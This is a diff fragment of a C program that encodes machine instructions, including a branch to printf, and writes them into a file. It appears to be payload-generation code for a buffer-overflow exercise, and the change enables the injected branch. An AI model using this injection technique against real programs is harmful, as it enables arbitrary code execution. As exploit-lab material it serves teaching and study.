@@ -51,10 +51,9 @@ int main(void){
    ulInstruction = MiniAssembler_strb(0, 1);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
-   /* b  printf     
+   /* b  printf     */
    ulInstruction = MiniAssembler_b(0x40089c, pAAttack + 20);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
-*/
 
    /* Writes the null byte at the end of the instructions */
    for (i = 0; i < 32; i++)
